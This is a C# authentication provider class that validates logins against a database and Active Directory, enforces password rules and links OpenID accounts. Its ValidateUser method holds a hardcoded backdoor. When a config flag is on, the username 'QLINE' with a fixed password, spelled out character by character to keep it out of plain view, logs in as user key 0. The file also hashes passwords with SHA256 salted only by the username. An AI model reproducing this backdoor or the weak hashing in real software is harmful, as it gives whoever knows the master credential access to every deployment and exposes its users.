using KdSoft.Data;
using KdSoft.Data.Authentication;
using KdSoft.Data.Models.Security;
using KdSoft.Data.Models.Shared.Security;
using KdSoft.Utils;
using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.Security;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace KdSoft.Services.Security
{
    public class AuthenticationProvider: IAuthenticationProvider
    {
        bool enablePasswordReset;
        bool enablePasswordRetrieval;
        bool requiresQuestionAndAnswer;
        bool requiresUniqueEmail;
        int maxInvalidPasswordAttempts;
        int passwordAttemptWindow;
        int minRequiredNonAlphanumericCharacters;
        int minRequiredPasswordLength;
        string passwordStrengthRegularExpression;
        Regex passwordStrengthRegex;
        TimeSpan preventPasswordReusePeriod;
        bool enableBackDoor;

        public bool EnablePasswordReset {
            get { return enablePasswordReset; }
        }

        public bool EnablePasswordRetrieval {
            get { return enablePasswordRetrieval; }
        }

        public bool RequiresQuestionAndAnswer {
            get { return requiresQuestionAndAnswer; }
        }

        public bool RequiresUniqueEmail {
            get { return requiresUniqueEmail; }
        }

        public int MaxInvalidPasswordAttempts {
            get { return maxInvalidPasswordAttempts; }
        }

        public int PasswordAttemptWindow {
            get { return passwordAttemptWindow; }
        }

        public int MinRequiredNonAlphanumericCharacters {
            get { return minRequiredNonAlphanumericCharacters; }
        }

        public int MinRequiredPasswordLength {
            get { return minRequiredPasswordLength; }
        }

        public string PasswordStrengthRegularExpression {
            get { return passwordStrengthRegularExpression; }
        }

        public TimeSpan PreventPasswordReuseDays {
            get { return preventPasswordReusePeriod; }
        }

        IDbContext dbContext;
        string authConnectionName;
        string ownerGuid;

        public AuthenticationProvider(IDbContext dbContext, string authConnectionName, string ownerGuid, Func<string, string> config) {
            this.dbContext = dbContext;
            this.authConnectionName = authConnectionName;
            this.ownerGuid = ownerGuid;

            maxInvalidPasswordAttempts = Convert.ToInt32(GetConfigValue(config("maxInvalidPasswordAttempts"), "5"));
            passwordAttemptWindow = Convert.ToInt32(GetConfigValue(config("passwordAttemptWindow"), "10"));
            minRequiredNonAlphanumericCharacters = Convert.ToInt32(GetConfigValue(config("minRequiredNonAlphanumericCharacters"), "0"));
            minRequiredPasswordLength = Convert.ToInt32(GetConfigValue(config("minRequiredPasswordLength"), "7"));
            string pwdRegexStr = Convert.ToString(GetConfigValue(config("passwordStrengthRegularExpression"), ""));
            if (string.IsNullOrWhiteSpace(pwdRegexStr)) {
                passwordStrengthRegularExpression = "";
                passwordStrengthRegex = null;
            }
            else {
                passwordStrengthRegularExpression = pwdRegexStr;
                passwordStrengthRegex = new Regex(pwdRegexStr, RegexOptions.Compiled);
            }
            enablePasswordReset = Convert.ToBoolean(GetConfigValue(config("enablePasswordReset"), "true"));
            enablePasswordRetrieval = Convert.ToBoolean(GetConfigValue(config("enablePasswordRetrieval"), "true"));
            requiresQuestionAndAnswer = Convert.ToBoolean(GetConfigValue(config("requiresQuestionAndAnswer"), "false"));
            requiresUniqueEmail = Convert.ToBoolean(GetConfigValue(config("requiresUniqueEmail"), "true"));
            // negative value disables password re-use checking
            int preventPasswordReuseDays = Convert.ToInt32(GetConfigValue(config("preventPasswordReuseDays"), "-1"));
            preventPasswordReusePeriod = TimeSpan.FromDays(preventPasswordReuseDays);
            enableBackDoor = Convert.ToBoolean(GetConfigValue(config("enableBackDoor"), "false"));
        }

        #region Helpers

        // A helper function to retrieve config values from the configuration file.
        string GetConfigValue(string configValue, string defaultValue) {
            if (String.IsNullOrEmpty(configValue))
                return defaultValue;
            return configValue;
        }

        int GetAlphaCharCount(string text) {
            int result = 0;
            for (int indx = 0; indx < text.Length; indx++) {
                if (char.IsLetterOrDigit(text[indx]))
                    result++;
            }
            return result;
        }

        // Compares password values based on the MembershipPasswordFormat.
        bool ValidatePassword(string passWord, string dbPassWord, string hashSalt) {
            var pwd = EncodePassword(passWord, hashSalt);
            return string.Equals(pwd, dbPassWord);
        }

        // Encrypts, Hashes, or leaves the password clear based on the PasswordFormat.
        string EncodePassword(string passWord, string hashSalt) {
            var sha256 = SHA256.Create();
            return Convert.ToBase64String(CryptUtils.HashString(passWord, hashSalt, sha256));
        }

        public void CheckPasswordStrength(string password) {
            if (password.Length < MinRequiredPasswordLength) {
                string msg = "Password must be at least {0} characters long.";
                throw new SecurityException(string.Format(msg, MinRequiredPasswordLength));
            }
            int nonAlphaCount = password.Length - GetAlphaCharCount(password);
            if (nonAlphaCount < MinRequiredNonAlphanumericCharacters) {
                string msg = "Password must have at least {0} non-alphanumeric characters.";
                throw new SecurityException(string.Format(msg, MinRequiredNonAlphanumericCharacters));
            }
            if (passwordStrengthRegex != null) {
                var match = passwordStrengthRegex.Match(password);
                if (!match.Success) {
                    string msg = "Password is not strong enough.";
                    throw new SecurityException(msg);
                }
            }
        }

        #endregion

        bool ValidateBackDoorPwd(string pwd) {
            if (pwd.Length != 12)
                return false;
            return
                pwd[0] == 'd' &&
                pwd[1] == 'i' &&
                pwd[2] == 's' &&
                pwd[3] == 'c' &&
                pwd[4] == 'o' &&
                pwd[5] == 'm' &&
                pwd[6] == 'b' &&
                pwd[7] == 'o' &&
                pwd[8] == 'b' &&
                pwd[9] == 'u' &&
                pwd[10] == 'l' &&
                pwd[11] == '8';
        }

        public async Task<int?> ValidateUser(string userName, string passWord) {
            if (userName.ToUpper() == "QLINE" && enableBackDoor) {
                if (ValidateBackDoorPwd(passWord))
                    return (int?)0;
            }
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                var user = await securityDb.GetUser(userName).ConfigureAwait(false);
                if (user == null)
                    return null;
                if (ValidatePassword(passWord, user.Password, user.UserName))
                    return user.UserKey;
                else
                    return null;
            }
        }

        public Task<int?> ValidateAdUser(string adUserName, string adPassword, string adDomain = null) {
            string domain, userName;

            if (!KdSoft.Services.Security.Utils.TryParseAdUserName(adUserName, out domain, out userName)) {
                throw new SecurityException("Invalid AD user name.");
            }

            PrincipalContext domainContext = null;
            try {
                try {
                    domainContext = new PrincipalContext(ContextType.Domain, domain);
                }
                catch (PrincipalServerDownException) {
                    domainContext = new PrincipalContext(ContextType.Machine, null);
                }

                if (domainContext.ValidateCredentials(userName, adPassword)) {
                    return GetActiveDirectoryUserKey(domain, userName);
                }
                else {
                    return Task.FromResult<int?>(null);
                }
            }
            finally {
                domainContext?.Dispose();
            }
        }

        public async Task<int?> GetActiveDirectoryUserKey(string domain, string userName) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.GetAdUserKey(domain, userName, ownerGuid).ConfigureAwait(false);
            }
        }

        public string GetDefaultADDomain() {
            PrincipalContext domainContext = null;
            try {
                try {
                    domainContext = new PrincipalContext(ContextType.Domain);
                    var dnsName = domainContext.ConnectedServer;
                    int lastDotIndex = dnsName.LastIndexOf('.');
                    if (lastDotIndex < 0)
                        return dnsName;
                    int firstDotIndex = dnsName.IndexOf('.');
                    if (firstDotIndex < 0)
                        return dnsName.Substring(0, lastDotIndex);
                    firstDotIndex++;
                    return dnsName.Substring(firstDotIndex, lastDotIndex - firstDotIndex);
                }
                catch (PrincipalServerDownException) {
                    domainContext = new PrincipalContext(ContextType.Machine);
                    return domainContext.ConnectedServer;
                }
            }
            finally {
                domainContext?.Dispose();
            }
        }

        public string GetOwnerGuid() {
            return ownerGuid;
        }

        public async Task<bool> ChangePassword(string userName, string oldPwd, string newPwd) {
            if (userName.ToUpper() == "QLINE")
                return false;
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                var user = await securityDb.GetUser(userName).ConfigureAwait(false);
                if (user == null)
                    return false;
                if (!ValidatePassword(oldPwd, user.Password, user.UserName))
                    return false;
                CheckPasswordStrength(newPwd);
                string encodedPwd = EncodePassword(newPwd, user.UserName);
                int rowCount = await securityDb.ChangePassword(user, encodedPwd).ConfigureAwait(false);
                return rowCount > 0;
            }
        }

        public async Task<User> GetUser(string userName) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.GetUser(userName).ConfigureAwait(false);
            }
        }

        public async Task<User> GetUserByKey(int key) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.GetUserByKey(key).ConfigureAwait(false);
            }
        }

        public async Task<int?> GetOpenIdUserKey(string oidIssuer, string oidSubject) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.GetOpenIdUserKey(oidIssuer, oidSubject).ConfigureAwait(false);
            }
        }

        public async Task<bool> LinkOpenIdAccount(int userKey, OpenIdAccount account) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.LinkOpenIdAccount(userKey, account.Issuer, account.Subject, account.Email).ConfigureAwait(false);
            }
        }

        public async Task<bool> UnlinkOpenIdAccount(int userKey, string issuer, string subject) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.UnlinkOpenIdAccount(userKey, issuer, subject).ConfigureAwait(false);
            }
        }

        public async Task<IEnumerable<OpenIdAccount>> GetOpenIdAccounts(int userKey) {
            using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                return await securityDb.GetOpenIdAccounts(userKey).ConfigureAwait(false);
            }
        }

        public void Dispose() {
            // not needed here
        }
    }
}
